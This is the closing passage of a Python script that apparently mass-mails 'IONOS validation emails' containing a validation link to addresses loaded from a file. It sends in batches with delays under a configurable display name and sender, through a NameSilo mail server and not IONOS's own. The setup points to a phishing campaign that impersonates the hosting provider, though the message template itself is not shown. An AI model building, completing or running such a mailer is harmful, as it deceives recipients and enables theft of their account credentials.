                       help='Log file (default: ionos_validation_log.csv)')
    
    args = parser.parse_args()
    
    # Check if configuration is set
    if "yourdomain.com" in EMAIL_CONFIG["host"] and not args.test:
        print("⚠️  WARNING: Please configure EMAIL_CONFIG at the top of this script")
        print("   Set your NameSilo mail server, username, and password")
        print(f"   Current host: {EMAIL_CONFIG['host']}")
        print(f"   Current username: {EMAIL_CONFIG['username']}")
        print(f"   Current sender: {DISPLAY_NAME} <{SENDER_EMAIL}>")
        print(f"   Validation link: {VALIDATION_LINK}")
        answer = input("\n   Continue anyway? (y/n): ")
        if answer.lower() != 'y':
            return
    
    # Initialize sender
    sender = IONOSEmailSender(
        test_mode=args.test, 
        log_file=args.log
    )
    
    # Load emails
    print(f"📂 Loading emails from: {args.file}")
    emails = sender.load_emails_from_file(args.file, args.column)
    
    if not emails:
        print("❌ No valid emails found. Exiting.")
        return
    
    # Apply limit if specified
    if args.limit > 0:
        emails = emails[:args.limit]
        print(f"📝 Limiting to {args.limit} emails")
    
    # Confirm before sending
    if not args.test:
        print(f"\n⚠️  READY TO SEND IONOS VALIDATION EMAILS")
        print(f"   Emails: {len(emails)}")
        print(f"   Sender: {DISPLAY_NAME} <{SENDER_EMAIL}>")
        print(f"   Validation Link: {VALIDATION_LINK}")
        print(f"   Campaign Year: {CAMPAIGN_YEAR}")
        print(f"   Batch size: {args.batch_size}")
        print(f"   Delay: {args.delay}s")
        
        answer = input("\n📤 Start sending validation emails? (y/n): ")
        if answer.lower() != 'y':
            print("❌ Campaign cancelled.")
            return
    
    # Start sending
    try:
        await sender.send_all_emails(
            emails, 
            batch_size=args.batch_size,
            delay=args.delay
        )
    except KeyboardInterrupt:
        print("\n\n⚠️  Campaign interrupted by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print("❌ Python 3.7 or higher is required")
        sys.exit(1)
    
    # Check required packages
    required_packages = ['aiosmtplib', 'pandas']
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("❌ Missing required packages:")
        for package in missing_packages:
            print(f"   - {package}")
        print("\nInstall with: pip install aiosmtplib pandas")
        sys.exit(1)
    
    # Run main function
    asyncio.run(main())